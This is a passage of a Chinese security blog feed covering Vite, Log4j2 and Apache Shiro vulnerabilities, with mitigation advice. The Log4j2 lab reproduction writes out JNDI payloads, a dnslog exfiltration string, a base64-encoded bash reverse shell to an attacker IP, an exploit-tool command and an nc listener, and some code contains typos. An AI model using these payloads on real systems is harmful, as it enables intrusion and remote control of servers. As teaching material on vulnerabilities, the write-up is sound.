可以访问。</li><li><strong>对路由请求进行严格检查</strong>：在代理层对包含 ?raw?? / ?import&amp;raw?? 字样的请求进行拦截，阻断对 Vite Dev Server 的直连访问。</li></ul><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p><strong>CVE-2025-30208</strong> 展示了在前端开发服务器中安全控制的重要性——即便只是用于开发调试，也可能因意外暴露而导致信息泄露风险。</p><p>针对该漏洞，<strong>最安全的做法</strong>是在生产环境<strong>避免直接使用 Vite Dev Server</strong>，同时<strong>升级到官方修复版本</strong>。对于内网或测试场景，应确保只在可信网络中启用对外访问，或为 Vite Dev Server 配置更严格的访问限制。</p><ul><li><strong>若仅在本地/开发环境使用 Vite</strong>：线上对外并没有 “Vite Dev Server”，那么不会受到这个漏洞影响。</li><li><strong>若在生产环境也对外暴露 Vite Dev Server</strong>：才有必要升级到 Vite 的修复版本，或者至少确保不对外开放该调试服务。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Log4j2漏洞</title>
      <link href="/2025/04/10/log4j2-lou-dong/"/>
      <url>/2025/04/10/log4j2-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Log4j2漏洞"><a href="#Log4j2漏洞" class="headerlink" title="Log4j2漏洞"></a>Log4j2漏洞</h1><p>​Log4j2漏洞，特别是CVE-2021-44228，是一个严重的安全漏洞，它允许攻击者通过构造特定的输入，利用**<u>Java命名和目录接口（JNDI）执行远程代码</u>**。以下是对该漏洞的详细解析：</p><h3 id="1-漏洞简介"><a href="#1-漏洞简介" class="headerlink" title="1 漏洞简介"></a>1 漏洞简介</h3><p>​Apache Log4j2是一个基于Java的<strong>日志记录工具</strong>，被广泛应用于业务系统开发中。它允许开发者将程序的输入输出信息进行日志记录，并可以控制日志信息输送的目的地，如控制台、文件、GUI组件等。然而，在2021年12月，Apache官方披露了Log4j2的一个远程代码执行（RCE）漏洞，编号为CVE-2021-44228。</p><h3 id="2-漏洞原理"><a href="#2-漏洞原理" class="headerlink" title="2 漏洞原理"></a>2 漏洞原理</h3><p>​在输出日志信息时允许开发人员<strong>通过相应的协议去请求远程主机上的资源</strong>。 而开发人员在处理数据时，并没有对用户输入的信息进行判断，导致Log4j2请求远程主机上的含有恶意代码的资源 并执行其中的代码，从而造成远程代码执行漏洞。</p><p>​该漏洞的根源在于Log4j2的<strong>递归解析</strong>功能。当Log4j2在处理日志消息时，<u><strong>如果消息中包含了<code>${</code>开头的字符串，它会被视为一个可替换的变量，并尝试通过JNDI等方式解析该变量的值</strong></u>。攻击者可以构造包含恶意JNDI查询的日志消息，从而触发JNDI注入，最终执行远程代码。</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">${data:MM-dd-yyyy}</span><br><span class="line">${java:version}</span><br></pre></td></tr></tbody></table></figure><h4 id="JNDI（使用名称来访问对象）"><a href="#JNDI（使用名称来访问对象）" class="headerlink" title="JNDI（使用名称来访问对象）"></a>JNDI（使用名称来访问对象）</h4><p>​开发人员一般会使用log4j2在日志中输出一些变量，log4j2 除了可以输出程序中的变量，它还提供了多种<strong>lookup</strong>功能插件，可以用来查找更多数据用于输出。lookup在log4j2中，就是允许在输出日志的时候，通过多种方式去查找要输出的内容，其中就可以使用Jndi Lookup。</p><p>​<strong>JNDl</strong> （Java Naming and Directory Interface，JAVA命名和目录接口）它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中<strong>可以使用名称来访问对象</strong>。JNDI下面有很多目录接口，用于不同的数据源的查找引用。</p><p><img src="https://pic1.imgdb.cn/item/681723f858cb8da5c8db0f21.png"></p><p>​JNDI可以使用相应目录接口请求普通数据，还可以请求Java对象。而且JNDI支持以命名引用(Naming References)的方式去远程下载一个class文件，然后加载该class文件并构建对象。若下载的是攻击者构建的含有恶意代码的class文件，则会在加载时执行恶意代码。</p><p>​<u><strong>在这些目录接口中我们可以使用LDAP或RMI去下载远程主机上的cIass文件。</strong></u></p><h4 id="LDAP（轻型目录访问协议）"><a href="#LDAP（轻型目录访问协议）" class="headerlink" title="LDAP（轻型目录访问协议）"></a>LDAP（轻型目录访问协议）</h4><p>​<strong>轻型目录访问协议</strong>：是一个开放的，中立的，工业标准的应用协议，通过IP协议提供访问控制和维护分布式信息的目录信息。目录是一个为查询、浏览和搜索而优化的专业分布式数据库，它呈树状结构组织数据，就好像Linux/Unix系统中的文件目录一样。</p><h4 id="RMI（远程方法调用）"><a href="#RMI（远程方法调用）" class="headerlink" title="RMI（远程方法调用）"></a>RMI（远程方法调用）</h4><p>​远程方法调用:它是一种机制，能够让在<u><strong>某个java虚拟机上的对象调用另一个Java虚拟机的对象的方法</strong></u>。</p><h4 id="触发过程"><a href="#触发过程" class="headerlink" title="触发过程"></a>触发过程</h4><p>log4j2远程代码执行漏洞大致过程(此处使用RMI，LDAP同理）：</p><p>假如有一个Java程序（登陆框），输错5次密码，将该用户名存储到日志中去，</p><ol><li>攻击者发送一个HTTP请求，其用户名为${jndi:rmi://rmi服务器地址/Exploit)，输错5次密码后将构造好的用户名存入日志，</li><li>被攻击服务器发现要输出的信息中有${}，则其中的内容要单独处理，进一步解析是JNDI扩展内容且使用的是RMI，而后根据RMI服务器地址去请求Exploit。</li><li>RMI服务器返回Reference对象（用于告诉请求端所请求对象所在的类)，而该Reference指定了远端文件下载服务器上含有恶意代码的class文件。</li><li>被攻击服务器通过Reference对象去请求文件下载服务器上的class文件。</li><li>被攻击服务器下载恶意class文件并执行其中的恶意代码</li></ol><p><img src="https://pic1.imgdb.cn/item/6817315c58cb8da5c8db5ac2.png"></p><h3 id="3-漏洞影响范围"><a href="#3-漏洞影响范围" class="headerlink" title="3 漏洞影响范围"></a>3 漏洞影响范围</h3><p>​该漏洞影响Apache Log4j 2.0至2.14.1版本。一旦应用程序使用了这些版本的Log4j2，并且允许用户输入日志消息或控制日志消息的生成，就可能受到攻击。</p><h3 id="4-漏洞利用方式"><a href="#4-漏洞利用方式" class="headerlink" title="4 漏洞利用方式"></a>4 漏洞利用方式</h3><p>攻击者可以通过多种方式利用该漏洞，包括但不限于：</p><ul><li>构造包含恶意JNDI查询的HTTP请求，发送给使用Log4j2记录HTTP请求日志的应用程序。</li><li>在应用程序的输入字段中注入恶意JNDI查询，这些输入字段的值会被记录到日志中。</li><li>通过其他方式触发Log4j2记录包含恶意JNDI查询的日志消息。</li></ul><h3 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5 防御措施"></a>5 防御措施</h3><p>为了防御该漏洞，可以采取以下措施：</p><ul><li><strong>升级到安全版本</strong>：将Log4j2升级到2.15.0或更高版本，这些版本已经修复了漏洞。</li><li><strong>禁用JNDI功能</strong>：如果不需要JNDI功能，可以在Log4j2的配置中禁用它。</li><li><strong>限制日志消息的输入</strong>：对应用程序中所有可能记录到日志的输入进行严格的验证和清理，防止恶意输入。</li><li><strong>监控和检测</strong>：监控应用程序的日志文件和系统日志，以检测可能的JNDI注入攻击。</li><li><strong>网络隔离</strong>：限制应用程序的外部网络访问，特别是对那些可能用于JNDI查询的端口和协议。</li></ul><h3 id="6-漏洞复现"><a href="#6-漏洞复现" class="headerlink" title="6 漏洞复现"></a>6 漏洞复现</h3><h4 id="6-1-漏洞产生过程模拟"><a href="#6-1-漏洞产生过程模拟" class="headerlink" title="6.1 漏洞产生过程模拟"></a>6.1 漏洞产生过程模拟</h4><p>创建一个Maven项目，在pom.xml文件中引l入log4j依赖，指定版本为2.14.1。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.1ogging.log4j&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;org.apache.1ogging.1og4j&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;2.14.1&lt;/versiony</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></tbody></table></figure><p>模拟黑客服务器：</p><ol><li>创建EvilObj类，执行Windows命令打开计算器。</li></ol><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evilobj</span> {</span><br><span class="line"><span class="keyword">static</span> {</span><br><span class="line">System.out.println(<span class="string">"执行恶意代码！"</span>);</span><br><span class="line"><span class="keyword">try</span> {</span><br><span class="line"><span class="comment">//执行命令打开计算器</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">    }<span class="keyword">catch</span> (IOException e) {</span><br><span class="line">e.printStackTrace();</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>创建RMIServer类，用于开启RMI服务。</li></ol><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> {</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">        <span class="comment">//启动rmi服务，端口为1099</span></span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry();</span><br><span class="line">        <span class="comment">//创建资源，指定资源为本机rmi目录下的Evilobj类</span></span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">"rmi.EvilObj"</span>,<span class="string">"rmi.EvilObj"</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referencewrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(reference);</span><br><span class="line">        <span class="comment">//绑定资源，用于客户机访问对应资源</span></span><br><span class="line">        registry.bind(<span class="string">"evil"</span>, referencewrapper);</span><br><span class="line">        System.out.println(<span class="string">"RMI服务初始化完成"</span>);</span><br><span class="line">} <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">e.printStackTrace(O;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>模拟受害主机：</p><ol><li>创建HackedServer类，模拟攻击者发送信息，受害服务器将对应信息作为error级别日志输出。</li></ol><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hackedserver</span>{</span><br><span class="line"><span class="comment">//创建日志记录器</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(string... args)</span>{</span><br><span class="line">System.out.println(<span class="string">"被攻击服务器"</span>);</span><br><span class="line"><span class="comment">//模拟攻击者发送请求中的username字段，指向攻击者服务器上的恶意class</span></span><br><span class="line"><span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">"${jndi:rmi://192.168.200.95/evil}"</span>;</span><br><span class="line"><span class="comment">//输出错误日志信息</span></span><br><span class="line">logger.error(<span class="string">"errorinfo: {}!"</span>,username);</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="6-2-漏洞复现过程"><a href="#6-2-漏洞复现过程" class="headerlink" title="6.2 漏洞复现过程"></a>6.2 漏洞复现过程</h4><h5 id="CVE-2021-12-09"><a href="#CVE-2021-12-09" class="headerlink" title="CVE-2021-12-09"></a>CVE-2021-12-09</h5><p>初始页面：</p><p><img src="https://pic1.imgdb.cn/item/6817449358cb8da5c8dc085b.png"></p><p>点击?????，出现URL参数</p><p><img src="https://pic1.imgdb.cn/item/681744cf58cb8da5c8dc0b4e.png"></p><p>可以在payload处进行操作，因为此靶场存在一些过滤，所以payload内容需要进行URL编码之后才能执行。</p><p>先使用dnslog外带，来验证漏洞的存在</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=${jndi:ldap://${sys:java.version}.rpg11t.dnslog.cn}</span><br></pre></td></tr></tbody></table></figure><p>如果网页在转圈，说明正在执行，运行一段时间后，回显OK</p><p><img src="https://pic1.imgdb.cn/item/6817472558cb8da5c8dc119a.png"></p><p>查看DNSLOG，显示版本号</p><p><img src="https://pic1.imgdb.cn/item/6817475b58cb8da5c8dc11ae.png"></p><p>利用JNDI注入反弹shell：</p><ol><li>准备反弹shell，并将此命令进行Base64编码</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.116.75/4444 0&gt;&amp;1</span><br><span class="line"></span><br><span class="line">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExNi43NS80NDQ0IDA+JjE=</span><br></pre></td></tr></tbody></table></figure><ol start="2"><li>使用JNDIExploit进行漏洞利用，将上述Base64编码结果 填入指定位置</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c</span><br><span class="line">{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjExNi43NS80NDQ0IDA+JjE=}|</span><br><span class="line">{base64,-d}|{bash,-i}" -A "192.168.116.75"</span><br></pre></td></tr></tbody></table></figure><p><img src="https://pic1.imgdb.cn/item/6817638958cb8da5c8dc5641.png"></p><ol start="3"><li>在攻击机开启监听</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></tbody></table></figure><ol start="4"><li>选择漏洞利用工具生成的JDK下的URL，修改网页的payload中信息</li></ol><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmi://192.168.116.75:1099/sshowl</span><br></pre></td></tr></tbody></table></figure><p>修改payload，该靶场还需对payload的值进行URL编码</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.116.67/hello?payload=${jndi:rmi://192.168.116.75:1099/sshowl}</span><br><span class="line"></span><br><span class="line">URL编码后：http://192.168.116.67/hello?payload=%24%7Bjndi%3Armi%3A%2F%2F192.168.116.75%3A1099%2Fsshowl%7D</span><br></pre></td></tr></tbody></table></figure><p>反弹shell成功。</p>]]></content>
      
      
      <categories>
          
          <category> Apache漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA框架漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Shiro漏洞</title>
      <link href="/2025/04/10/shiro-lou-dong/"/>
      <url>/2025/04/10/shiro-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Shiro漏洞"><a href="#Shiro漏洞" class="headerlink" title="Shiro漏洞"></a>Shiro漏洞</h1><p>Shiro漏洞主要指的是Apache Shiro框架中存在的安全漏洞，这些漏洞可能被攻击者利用来执行恶意代码或获取敏感信息。Apache Shiro是一个功能强大且易于使用的Java<strong>安全框架</strong>，它提供了身份验证、授权、密码学和会话管理等功能，用于保护应用程序的安全。然而，由于框架设计或实现上的缺陷，Shiro在某些情况下会存在安全漏洞。</p><h3 id="Shiro漏洞的类型"><a href="#Shiro漏洞的类型" class="headerlink" title="Shiro漏洞的类型"></a>Shiro漏洞的类型</h3><p>Shiro漏洞的类型多种多样，但其中较为著名的是**<u>反序列化漏洞</u>**，特别是与“Remember Me”功能相关的漏洞。这些漏洞允许攻击者通过构造恶意的序列化数据来触发反序列化操作，进而执行任意代码或获取系统权限。</p><h3 id="Shiro服务器端识别身份加解密处理cookie的流程"><a href="#Shiro服务器端识别身份加解密处理cookie的流程" class="headerlink" title="Shiro服务器端识别身份加解密处理cookie的流程"></a>Shiro服务器端识别身份加解密处理cookie的流程</h3><h4 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h4><ol><li>用户使用账号密码进行登录，并勾选“RememberMe”。</li><li>Shiro验证用户登录信息，通过后，查看用户是否勾选了”RememberMe”。</li><li>若勾选，则将用户身份序列化，并将序列化后的内容进行AES加密，再使用base64编码。</li><li>最后将处理好的内容放于cookie中的rememberMe字段。</li></ol><h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><ol><li>当服务端收到来自未经身份验证的用户的请求时，会在客户端发送请求中的cookie中获取rememberMe字段内容</li><li>将获取到的rememberMe字段进行base64解码，再使用AES解密。</li><li>最后将解密的内容进行反序列化，获取到用户身份。</li></ol><h3 id="Shiro反序列化漏洞的示例"><a href="#Shiro反序列化漏洞的示例" class="headerlink" title="Shiro反序列化漏洞的示例"></a>Shiro反序列化漏洞的示例</h3><h4 id="Shiro-550（CVE-2016-4437）"><a href="#Shiro-550（CVE-2016-4437）" class="headerlink" title="Shiro-550（CVE-2016-4437）"></a>Shiro-550（CVE-2016-4437）</h4><ul><li>漏洞介绍</li></ul><p>​shiro-550主要是由shiro的rememberMe内容反序列化导致的命令执行漏洞，造成的原因是默认加密密钥是硬编码在shiro源码中，任何有权访问源代码的人都可以知道默认加密密钥。于是攻击者可以创建一个恶意对象，对其进行序列化、编码，然后将其作为cookie的rememberMe字段内容发送，Shiro将对其解码和反序列化，导致服务器运行一些恶意代码。</p><ul><li>特征：</li></ul><ol><li>cookie中含有rememberMe字段, 如:”rememberMe=JV+gEljeMVBj3EFY22otzX…”</li><li>cookie中含有”rememberMe=deleteMe”</li></ol><ul><li><strong>漏洞原理</strong>：<u>Shiro框架在登录时，如果勾选了“Remember Me”的功能，关闭浏览器再次访问时便无需再次登录。此时，cookie中会增加一个rememberMe字段</u>，其value的值是经过序列化、AES加密和Base64编码后得到的结果。由于AES加密的密钥被硬编码在代码中，<u>攻击者可以通过构造恶意的序列化数据，使用相同的密钥进行AES解密和Java反序列化</u>，从而执行任意代码。</li><li><strong>影响范围</strong>：Apache Shiro &lt;= 1.2.4</li></ul><p>复现：</p><p>初始界面</p><p><img src="https://pic1.imgdb.cn/item/67f77a6788c538a9b5c86947.png"></p><p>抓包存在remember me字段</p><p><img src="https://pic1.imgdb.cn/item/67f77d4088c538a9b5c86e3d.png"></p><p>接下来利用shiro反序列化工具，爆破加密密钥和利用链</p><p><img src="https://pic1.imgdb.cn/item/67f77cd188c538a9b5c86d8d.png"></p><p>然后命令执行</p><ul><li>修复建议：</li></ul><ol><li>更新shiro到1.2.4以上的版本。</li><li>不使用默认的加密密钥，改为随机生成密钥</li></ol><h4 id="Shiro-721（CVE-2019-12422）"><a href="#Shiro-721（CVE-2019-12422）" class="headerlink" title="Shiro-721（CVE-2019-12422）"></a>Shiro-721（CVE-2019-12422）</h4><ul><li>漏洞介绍</li></ul><p>​Shiro-721反序列化漏洞，使用由于Shiro通过使用AES-128-CBC模式进行cookie中rememberMe字段的加密，于是用户可通过Padding Oracle加密生成的攻击代码来构造恶意的rememberMe字段，并重新请求网站，进行反序列化攻击，最终导致任意代码执行。</p><ul><li><strong>漏洞原理</strong>：与Shiro-550类似，但加密方式改为了<strong>AES-CBC</strong>加密，且密钥是系统随机生成的。然而，这种加密模式可以通过Padding Oracle Attack（填充攻击）来绕过。攻击者可以使用有效的RememberMe Cookie作为前缀，然后精心<u>构造恶意的</u><u>RememberMe Cookie来实施反序列化攻击</u>。</li><li><strong>影响范围</strong>：Apache Shiro&lt;1.4.2</li></ul><h5 id="AES-的-CBC-模式"><a href="#AES-的-CBC-模式" class="headerlink" title="AES 的 CBC 模式"></a><strong>AES 的 CBC 模式</strong></h5><blockquote><p>​AES加密算法全称是AdvancedEncryptionStandard（高级加密标准)，是最为常见的对称加密算法之一。AES的区块长度固定为128位，密钥长度则可以是128，192或256位。分组密码在加密时明文分组的长度是固定的，而使用中待加密消息的数据量是不定的，数据格式可能是多种多样的。为了能在各种应用场合安全地使用分组密码，通常对不同的使用目的运用不同的工作模式。AES有五种工作模式：</p><p>电码本模式(Electronic Codebook Book，ECB)</p><p>密码分组链接模式(Cipher Block Chaining，CBC)</p><p>计算器模式(Counter,CTR) </p><p>密码反馈模式(Cipher FeedBack，CFB)</p><p>输出反馈模式(Output FeedBack，OFB)。</p><p><u>而在Shiro721中使用的就是<strong>CBC</strong>模式</u>。</p><p>​密码分组链接模式（CipherBlockChaining，CBC)，其中”分组“是指加密和解密过程都是以分组进行的。每一个分组大小为128bits(16字节)，如果明文的长度不是16字节的整数倍，需要对最后一个分组进行填充(padding)，使得最后一个分组长度为16字节。”链接”是指密文分组像链条一样相互连接在一起。</p><p>**<u>加密过程</u>**：（串行运算，需要上一个组的密文，才能进行下一组的异或）</p><p><img src="https://pic1.imgdb.cn/item/67f7857988c538a9b5c87d6c.png"></p><p>1.发送方将明文(Plaintext)成若干分组(Plaintext[1],，Plaintext[n])，每个分组16个字节，不够则填充。<br>2.生成一个跟分组长度一致(16个字节)的IV(InitializationVector，初始向量），用于后续的异或运算。<br>3.将IV与第一个明文分组(Plaintext[1])进行异或得到m1（可以看做一个中间值）。<br>4.将m1使用密钥Key进行加密得到第一个密文分组(Ciphertext[1])。<br>5.将上一步得到的密文与下一个明文分组进行异或，得到一个新的中间值，再将这个中间值使用Key进行加密得到后续的一个密文分<br>组。接着重复这个过程直到所有明文分组被加密。<br>6.为了接收方能够成功解密，还需要将IV也发送给接收方。为描述方便，这里把将IV当成Ciphertext[0]，发送时会将IV作为密文的第一个分组，最后将后续密文分组按顺序拼接即可得到最终的密文（Ciphertext）</p><p>**<u>解密过程</u>**（并行运算，知道所有密文分组，只需要单个解密即可）</p><p><img src="https://pic1.imgdb.cn/item/67f786cb88c538a9b5c87fa6.png"></p><ol><li>接收方将密文(Ciphertext) 分成若干分组(Ciphertext[1],..,Ciphertext[n])。</li><li>将第一个密文分组(Ciphertext[1])使用密钥Key进行解密，得到中间值m1。</li><li>将IV(Ciphertext[o])与m1进行异或运算得到第一个明文分组(Plaintext[1])。</li><li>将下一个密文分组使用Key进行解密得到一个新的中间值，而再将上一个密文分组与该中间值进行异或即可得到后续的一个明文分组。重复这个过程直到所有密文分组被解密。</li><li>最后将所有明文分组组合在一起即可获取到完整的明文(Plaintext)。</li></ol></blockquote><h5 id="Padding-Oracle-攻击原理"><a href="#Padding-Oracle-攻击原理" class="headerlink" title="Padding Oracle 攻击原理"></a><strong>Padding Oracle 攻击原理</strong></h5><blockquote><p>​Padding的含义是“填充”，在解密时，如果算法发现解密后得到的结果，它的填充方式不符合规则，那么表示输入数据有问题，对于解密的类库来说，往往便会抛出一个异常，提示Padding不正确。Oracle在这里便是“提示”的意思，和甲骨文公司没有任何关系。</p><p><strong>分组填充方式(PKCS5Padding,PKCS7Padding)</strong></p><p>​因为分组加密方式只能使用一个固定大小的密钥加密相同字节长度的明文（一般长度为8个字节或16个字节），所以需要将加密的明文按照密钥大小拆分为多块（所以也叫块加密），如果拆分后最后一个块明文长度不够，就需要填充字节来补齐长度。按照常见的PKCS#5或PKCS#7公钥加密标准，最后需要填充几个字节，那么每个填充字节的值就用所需填充的字节数，若最后一个明文刚好符合固定长度，就需填充一个完整分组。<br>通过下图我们可以更好的进行理解：</p><p><img src="https://pic1.imgdb.cn/item/67f799d488c538a9b5c89ff4.png"></p><p>​我们假设每个分组8个字节，当最后一个分组为8个字节长度时，就再填充8个字节，且每个字节的值都为16进制的“8”，即0x08。若最后一个分组为7个字节，则需要填充1个字节，该字节的值为0x01。以此类推，6个字节就需填充两个字节，都为0x02。<br>​那么它如何判断填充是否错误？当将密文解密后，其会检查明文最后的一个字节，若发现其为0x02，则继续检查倒数第二个字节是否为0x02，若倒数第二个字节不是0x02，则判断出填充错误。其判断方式就是通过去读明文最后一个字节填充的字节，根据该字节的值，继续向前检查。</p></blockquote><h5 id="Padding-Oracle"><a href="#Padding-Oracle" class="headerlink" title="Padding Oracle"></a><strong>Padding Oracle</strong></h5><blockquote><p>​当我们知晓IV与密文，输入点可控（能够任意输入IV与任意密文交由解密器解密），且当密文解密出错时，能够判断出是否是由于填充错误造成的，就能在不知道对称密钥的情况下，通过构造明文分组中不同的填充值，再利用填充时的错误回显或是时间延迟，进行爆破，推测出密文解密后的中间值，进而可以推测出原始明文，或是利用中间值结合特定的V构造出想要的明文。而这个利用错误回显或是时间延迟做判断的过程就称为oracle。<br>​接下分析该攻击的具体实现流程，前面我们知道了分组的填充方式以及如何判断填充是否错误，这里我们可以从第一个分组开始进行分析。</p><ul><li>关键词说明：<ul><li>Plaintext:明文，Plaintext[-n]:明文分组中最后第n个字节</li><li>m:中间值，由IV与Plaintext进行异或运算得到,m[-n]:中间值的最后第n个字节</li><li>oIV:初始向量，IV[-n]:初始向量的最后第n个字节</li><li>G_IV:构造的IV，G_IV[-n]:构造的IV的最后第n个字节</li></ul></li></ul><p>​        采用CBC模式进行解密时，其会将密文分组解密为一个中间值m，而后再将m与IV进行异或得到最后的明文分组。当我们可以控制输入的IV与密文时，<u>我们可以先只输入第一个密文分组，而将其解密后得到的就是完整的明文，是没有填充字节的，这必定会触发填充错误。于是我们可以尝试构造一个G_IV，使得中间值m与G_IV进行异或后得到的明文的最后一个字节Plaintext[-1]为0x01，这样就不会出现填充错误</u>。<br>​        那么如何找到这个G_IV呢？我们可以将G_V的前面7个字节全部设置为0（这样不会改变明文中的前七个字节），而最后一个字节G_IV[-1]从0x00开始到0xFF（一个字节为8位，最多为256种可能）进行尝试，当解出明文的最后一个字节不为0x01就会发生填充错误，由此进行判断，最后我们必然找的到一个G_IV[-1]使得”G_IV[-1] xor m[-1]=0x01”。</p><p>​找到这个G_IV[-1]后，我们可以有以下推论：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">G_IV[-1] xor m[-1]=0x01#找到一个G_IV[-1]与m[-1]异或为0x01</span><br><span class="line">G_IV[-1] xor 0x01=m[-1]#G_IV[-1]与0x01异或得到解密后的m[-1]</span><br><span class="line">IV[-1] xor m[-1]=Plaintext[-1]#将m[-1]与原本的Iv[-1]异或就会得到明文的最后一个字节</span><br></pre></td></tr></tbody></table></figure><p>​知道了m[-1]，这个同理我们可以继续构造G_IV[-1] xor m[-1]=0x02，G_IV[-2] xor m[-2]=0x02。因为m[-1]知道所以很容易得到G_IV[-1]，而后我们就可以将G_IV[-2]从0x00开始到0xFF，必定会找到GIV[-2]使得“GIV[-2] xor m[-2]=0x02”，此时不会发生填充错误。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">G_Iv[-2] xor m[-2] = 0x02</span><br><span class="line">G_IV[-2] xor Ox02 = m[-2]</span><br><span class="line">Iv[-2] xor m[-2] = Plaintext[-2]</span><br></pre></td></tr></tbody></table></figure><p>​于是可以继续构造G_IV[-3]……G_IV[-8]，我们就可以得到该明文分组的所有字节。接下来我们就可以在后续的分组中使用该方法来获取所有明文分组，但是后续的明文分组是使用上一个密文分组来进行异或，所以我们需要修改的是前一个密文分组。</p><p><strong>注意</strong>：当对最后一个密文分组的中间值进行猜解的时候，会遇到明文本身最后一个字节为填充字节，如0x02，可能会得出不同的两个结果。我们将最后一个字节构造成0x01时，无论前面字节是什么都不会触发填充错误，而将最后一个字节构造成0x02同样也不会报错。这时我们可以在最后一个填充字节判断成功的情况下，构造倒数第二字节为任意值都不出现填充错误，则明文最后一个字节就构造成了0x01。</p></blockquote><h5 id="CBC翻转攻击"><a 